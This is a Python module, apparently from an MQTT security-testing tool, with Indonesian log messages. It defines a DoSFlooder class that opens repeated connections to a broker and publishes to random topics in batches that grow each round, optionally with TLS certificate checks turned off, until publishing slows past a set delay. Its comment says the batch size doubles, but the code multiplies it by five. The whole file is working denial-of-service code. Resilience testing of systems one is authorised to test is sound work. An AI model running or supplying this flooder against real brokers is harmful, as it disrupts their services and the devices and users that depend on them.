import time
import ssl
import random
import string
from paho.mqtt import client as mqtt
from core.tls_utils import setup_tls_context

class DoSFlooder:
    def __init__(self, host, port=1883, username=None, password=None, logger=print, use_tls=False, allow_insecure=True):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.logger = logger
        self.use_tls = use_tls
        self.allow_insecure = allow_insecure

    def log(self, message):
        if self.logger:
            self.logger(message)

    def _generate_topic(self, i):
        return f"flood/topic_{i}_" + ''.join(random.choices(string.ascii_letters, k=5))

    def run(self, max_delay=1.0):
        self.log("[*] Memulai DoS flood hingga delay > 1 detik")

        errors = 0
        payload = "x" * 32  # 32 bytes
        total_sent = 0
        total_payload = 0
        i = 0
        batch_size = 10

        while True:
            start_batch = time.time()
            for j in range(batch_size):
                topic = self._generate_topic(i)
                try:
                    client = mqtt.Client()
                    if self.username and self.password:
                        client.username_pw_set(self.username, self.password)

                    if self.use_tls:
                        setup_tls_context(client, insecure=self.allow_insecure, logger=self.logger)

                    client.connect(self.host, self.port, keepalive=60)
                    client.loop_start()

                    result = client.publish(topic, payload)

                    if result.rc != mqtt.MQTT_ERR_SUCCESS:
                        self.log(f"[!] Gagal publish ke {topic} | rc = {result.rc}")
                        errors += 1
                    else:
                        total_sent += 1
                        total_payload += len(payload)

                    client.loop_stop()
                    client.disconnect()

                    i += 1

                except Exception as e:
                    self.log(f"[!] Error saat publish ke {topic}: {str(e)}")
                    errors += 1

            end_batch = time.time()
            batch_delay = end_batch - start_batch

            if batch_delay > max_delay:
                self.log(f"[!] Dihentikan: Delay publish batch {batch_size} topik melebihi {max_delay} detik.")
                break

            batch_size *= 5  # Eksponensial: 10 ➝ 20 ➝ 40 ➝ 80 dst.
            time.sleep(0.05)

        flood_result = {
            "total_topics": i,
            "total_messages": total_sent,
            "payload_size_kb": round(total_payload / 1024, 2),
            "reason": f"Delay melebihi {max_delay}s"
        }

        self.log(f"[✓] DoS flood selesai: {total_sent} pesan, {i} topik.")
        self.log(f"[✓] Ukuran payload total: {flood_result['payload_size_kb']} KB")

        return flood_result
